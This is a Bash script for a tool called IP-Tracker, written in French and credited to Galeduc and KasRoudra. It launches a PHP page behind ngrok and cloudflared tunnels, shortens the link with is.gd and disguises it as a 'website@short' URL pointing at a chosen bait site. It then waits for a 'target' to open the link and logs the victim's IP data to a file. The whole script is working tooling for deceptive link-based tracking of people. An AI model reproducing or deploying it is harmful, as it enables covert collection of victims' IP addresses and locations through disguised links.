#!/bin/bash

white="\033[1;37m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[1;35m"
cyan="\033[1;36m"
nc="\033[00m"
blue="\033[1;34m"


info="${cyan}[${white}+${cyan}] ${yellow}"
ask="${cyan}[${white}?${cyan}] ${purple}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${cyan}[${white}√${cyan}] ${green}"


version="1.3"

logo="
${red} ___ ____     _____               _
${cyan}|_ _|  _ \   |_   _| __ __ _  ___| | _____ _ __
${yellow} | || |_) |____| || '__/ _' |/ __| |/ / _ \ '__|
${blue} | ||  __/_____| || | | (_| | (__|   <  __/ |
${green}|___|_|        |_||_|  \__,_|\___|_|\_\___|_|
${purple}                               [By Galeduc]
"
options="${ask}Choisi une options:

${cyan}[${white}1${cyan}] ${yellow}Commencer
${cyan}[${white}0${cyan}] ${yellow}Quitter${blue}
"


if [ `command -v sudo` ] ; then
    sudo=true
else
    sudo=false
fi
if $sudo; then
if [ `command -v apt` ]; then
    pac_man="sudo apt"
elif  [ `command -v apt-get` ]; then
    pac_man="sudo apt-get"
elif  [ `command -v yum` ]; then
    pac_man="sudo yum"
elif [ `command -v dnf` ]; then
    pac_man="sudo dnf"
elif [ `command -v apk` ]; then
    pac_man="sudo apk"
elif [ `command -v pacman` ]; then
    pacman=true
else
    echo -e "${error}Aucun gestionnaire de paquets pris en charge trouvé ! Installez les packages manuellement !\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
    pac_man="apt"
elif [ `command -v apt-get` ]; then
    pac_man="apt-get"
elif [ `command -v brew` ]; then
    pac_man="brew"
else
    echo -e "${error}Aucun gestionnaire de paquets pris en charge trouvé ! Installez les packages manuellement !\007\n"
    exit 1
fi
fi

pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

killer() {
if [ `pidof php > /dev/null 2>&1` ]; then
    killall php
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    killall ngrok
fi
if [ `pidof cloudflared > /dev/null 2>&1` ]; then
    killall cloudflared
fi
if [ `pidof curl > /dev/null 2>&1` ]; then
    killall curl
fi
if [ `pidof wget > /dev/null 2>&1` ]; then
    killall wget
fi
}

netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}Pas internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

url_manager() {
    sed 's+website_name+'$mwebsite'+g' ip.php > index.php
    echo -e "${info}Vos URL sont : \n"
    sleep 1
    echo -e "${success}URL ${2} > ${1}\n"
    sleep 1
    netcheck
    masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1})
    if ! [[ -z $masked ]]; then
        echo -e "${success}URL ${3} > ${masked}\n"
        short=${masked#https://}
        echo -e "${success}URL ${4} > $mwebsite@${short}\n"
    fi
}


if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang ip.sh
termux=true
else
termux=false
fi

cwd=`pwd`

stty -echoctl

trap "echo -e '${success}Hâte de vous revoirs!\n'; exit" 2


if ! [ `command -v php` ]; then
    echo -e "${info}Installation php...."
    $pac_man install php -y
    pacin "php"
fi
if ! [ `command -v curl` ]; then
    echo -e "${info}Installation curl...."
    $pac_man install curl -y
    pacin "curl"
fi
if ! [ `command -v unzip` ]; then
    echo -e "${info}Installation unzip...."
    $pac_man install unzip -y
    pacin "unzip"
fi
if ! [ `command -v wget` ]; then
    echo -e "${info}Installation wget...."
    $pac_man install wget -y
    pacin "wget"
fi
if ! [ `command -v php` ]; then
    echo -e "${error}PHP ne peut pas être installé !\007\n"
    exit 1
fi
if ! [ `command -v curl` ]; then
    echo -e "${error}Curl ne peut pas être installé !\007\n"
    exit 1
fi
if ! [ `command -v unzip` ]; then
    echo -e "${error}Unzip ne peut pas être installé !\007\n"
    exit 1
fi
if ! [ `command -v wget` ]; then
    echo -e "${error}Wget ne peut pas être installé !\007\n"
    exit 1
fi
if [ `pidof php > /dev/null 2>&1` ]; then
    echo -e "${error}Le php précédent ne peut pas être fermé. Redémarrez le terminal !\007\n"
    killer; exit 1
fi
if [ `pidof ngrok > /dev/null 2>&1` ]; then
    echo -e "${error}Le ngrok précédent ne peut pas être fermé. Redémarrez le terminal !\007\n"
    killer; exit 1
fi



if ! [[ -f $HOME/.ngrokfolder/ngrok || -f $HOME/.cffolder/cloudflared ]] ; then
    # Termux should run from home
    if $termux; then
        if echo "$cwd" | grep -q "home"; then
            printf ""
        else
            echo -e "${error}Répertoire invalide. Redirection dans home !\007\n"
            exit 1
        fi
    fi
    if ! [[ -d $HOME/.ngrokfolder ]]; then
        cd $HOME && mkdir .ngrokfolder
    fi
    if ! [[ -d $HOME/.cffolder ]]; then
        cd $HOME && mkdir .cffolder
    fi
    arch=`uname -m`
    platform=`uname`
    while true; do
        echo -e "\n${info}Téléchargement de Tunnelers:\n"
        netcheck
        if [ -e ngrok.zip ];then
            rm -rf ngrok.zip
        fi
        cd "$cwd"
        if echo "$platform" | grep -q "Darwin"; then
            if echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-darwin-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64.tgz" -O "cloudflared.tgz"
                tar -zxf cloudflared.tgz > /dev/null 2>&1
                rm -rf cloudflared.tgz
                break
            elif echo "$arch" | grep -q "arm64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-arm64.zip" -O "ngrok.zip"
                ngrokdel
                echo -e "${error}Cloudflared n'est pas disponible pour l'architecture des appareils !"
                sleep 3
                break
            else
                echo -e "${error}Architecture de l'appareil inconnue. Téléchargez ngrok/cloudflared manuellement !"
                sleep 3
                break
            fi
        elif echo "$platform" | grep -q "Linux"; then
            if echo "$arch" | grep -q "aarch64"; then
                if [ -e ngrok-stable-linux-arm64.tgz ];then
                   rm -rf ngrok-stable-linux-arm64.tgz
                fi
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm64.tgz" -O "ngrok.tgz"
                tar -zxf ngrok.tgz
                rm -rf ngrok.tgz
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64" -O "cloudflared"
                break
            elif echo "$arch" | grep -q "arm"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-arm.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' -O "cloudflared"
                break
            elif echo "$arch" | grep -q "x86_64"; then
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-amd64.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' -O "cloudflared"
                break
            else
                wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/ngrok/ngrok-stable-linux-386.zip" -O "ngrok.zip"
                ngrokdel
                wget -q --show-progress "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386" -O "cloudflared"
                break
            fi
        else
            echo -e "${error}Plate-forme non prise en charge !"
            exit
        fi
    done
    sleep 1
    cd "$cwd"
    mv -f ngrok $HOME/.ngrokfolder
    mv -f cloudflared $HOME/.cffolder
    if $sudo; then
    sudo chmod +x $HOME/.ngrokfolder/ngrok
    sudo chmod +x $HOME/.cffolder/cloudflared
    else
    chmod +x $HOME/.ngrokfolder/ngrok
    chmod +x $HOME/.cffolder/cloudflared
    fi
fi

while true; do
clear
echo -e "$logo"
sleep 1
echo -e "$options"
sleep 1
printf "${cyan}\nGaleduc${nc}@${cyan}Tracker ${red}$ ${nc}"
read option
    if echo $option | grep -q "1"; then
        printf "\n${ask}Entre l'url du site piége (Exemple : google.com, youtube.com)\n${cyan}\nGaleduc${nc}@${cyan}Tracker ${red}$ ${nc}"
        read website
        if ! [ `echo $website | grep -q "http"` ]; then
            if ! (echo $website | grep -q "https"); then
                mwebsite="https://${website}"
            else
                mwebsite="http://${website}"
            fi
        else
            mwebsite=$website
        fi
        m=$(curl -s --head -w %{http_code} $mwebsite -o /dev/null)
        if [[ -z "$website" ]]; then
            echo -e "\n${error}Pas de site Web !"
            sleep 2
        elif [[ "$website" =~ " " ]]; then
            echo -e "\n${error}Site Web invalide ! Veuillez éviter les espaces."
            sleep 2
        elif [[ "$website" =~ "/" ]]; then
            echo -e "\n${error}Site Web invalide ! Veuillez éviter les slash(/)"
            sleep 2
        elif echo "$m" | grep -q "000";then
            echo -e "\n${error}Le site Web n'existe pas."
            sleep 2
        else
            break
        fi
    elif echo $option | grep -q "m"; then
        xdg-open "https://github.com/KasRoudra/KasRoudra#My-Best-Works"
    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[IP-Tracker]
$red[Version]    ${cyan} :[1.3]
$red[Description]${cyan} :[IP Tracking tool]
$red[Author]     ${cyan} :[KasRoudra]
$red[Github]     ${cyan} :[https://github.com/KasRoudra] 
$red[Messenger]  ${cyan} :[https://m.me/KasRoudra]
$red[Email]      ${cyan} :[kasroudrakrd@gmail.com]"
        printf "${cyan}\nIP${nc}@${cyan}Tracker ${red}$ ${nc}"
        read about
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
if $termux; then
echo -e "\n${info}Si vous n'avez pas activé le point d'accès, veuillez l'activer !"
sleep 3
fi
echo -e "\n${info}Lancement de php server sur localhost:7777....\n"
netcheck
php -S 127.0.0.1:7777 > /dev/null 2>&1 &
sleep 2
echo -e "${info}Lancement de tunnelers......\n"
netcheck
if [ -e "$HOME/.cffolder/log.txt" ]; then
rm -rf "$HOME/.cffolder/log.txt"
fi
# Hotspot required for termux
if $termux; then
cd $HOME/.ngrokfolder && termux-chroot ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
cd $HOME/.cffolder && termux-chroot ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
else
cd $HOME/.ngrokfolder && ./ngrok http 127.0.0.1:7777 > /dev/null 2>&1 &
cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:7777" --logfile "log.txt" > /dev/null 2>&1 &
fi
sleep 8
ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
if (echo "$ngroklink" | grep -q "ngrok"); then
ngrokcheck=true
else
ngrokcheck=false
fi
cflink=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$HOME/.cffolder/log.txt")
if (echo "$cflink" | grep -q "cloudflare"); then
cfcheck=true
else
cfcheck=false
fi
while true; do
if ( $cfcheck && $ngrokcheck ); then
    echo -e "${success}Cloudflared et Ngrok ont démarré avec succès !\n"
    url_manager "$cflink" "1" "2" "3"
    url_manager "$ngroklink" "4" "5" "6"
    break
fi
if ( $cfcheck &&  ! $ngrokcheck ); then
    echo -e "${success}Cloudflared a démarré avec succès !\n"
    url_manager "$cflink" "1" "2" "3"
    break
fi
if ( $ngrokcheck && ! $cfcheck ); then
    echo -e "${success}Ngrok a démarré avec succès !\n"
    url_manager "$ngroklink" "1" "2" "3"
    break
fi
if ! ( $cfcheck && $ngrokcheck ) ; then
    echo -e "${error}Tunneling a échoué !\n"
    killer; exit 1
fi
done
sleep 1
status=$(curl -s --head -w %{http_code} 127.0.0.1:7777 -o /dev/null)
if echo "$status" | grep -q "200" || echo "$status" | grep -q "302" ;then
    echo -e "${success}PHP a démarré avec succès !\n"
else
    echo -e "${error}PHP ne démarre pas\n\007"
    killer; exit 1
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Attente d'une cible ${cyan}Appuyer sur ${red}Ctrl + C ${cyan}Pour quitter...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        clear
        echo -e "$logo"
        echo -e "\007\n${success}Votre cible a ouvert le lien\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        cat ip.txt >> $cwd/ips.txt
        echo -e "\n${info}Enregistrer dans ips.txt"
        rm -rf ip.txt
        echo -e "\n${info}En Attente. ${cyan}Appuyer sur ${red}Ctrl + C ${cyan}Pour quitter...\n"
    fi
    sleep 0.5
done 
